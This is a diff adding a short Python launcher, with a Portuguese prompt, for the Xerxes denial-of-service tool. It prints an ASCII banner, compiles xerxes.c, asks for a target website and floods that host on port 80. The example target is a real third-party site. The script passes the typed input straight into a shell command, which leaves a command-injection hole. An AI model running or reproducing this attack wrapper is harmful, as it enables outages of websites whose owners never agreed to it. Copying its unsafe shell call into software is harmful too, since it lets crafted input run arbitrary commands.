@@ -1,0 +1,17 @@
+import os
+os.system("clear")
+print("""
+    ###    #####                     ###                                   ##
+     ##   ##   ##                     ##                                   ##
+     ##   ##   ##   #####             ##      ######   ##  ##   #####     #####
+  #####   ##   ##  ##       ######    #####    ##  ##  ##  ##   ##  ##     ##
+ ##  ##   ##   ##   #####             ##  ##   ##      ##  ##   ##  ##     ##
+ ##  ##   ##   ##       ##            ##  ##   ##      ##  ##   ##  ##     ## ##
+  ######   #####   ######            ######   ####      ######  ##  ##      ###
+
+
+""")
+os.system("chmod +x xerxes.c")
+os.system("gcc xerxes.c -o xerxes")
+a = input("\n Insira o endereço do site, por exemplo >>> www.xvideos.com \n insira a url do site>>> : ")
+os.system("./xerxes "+a+" 80")
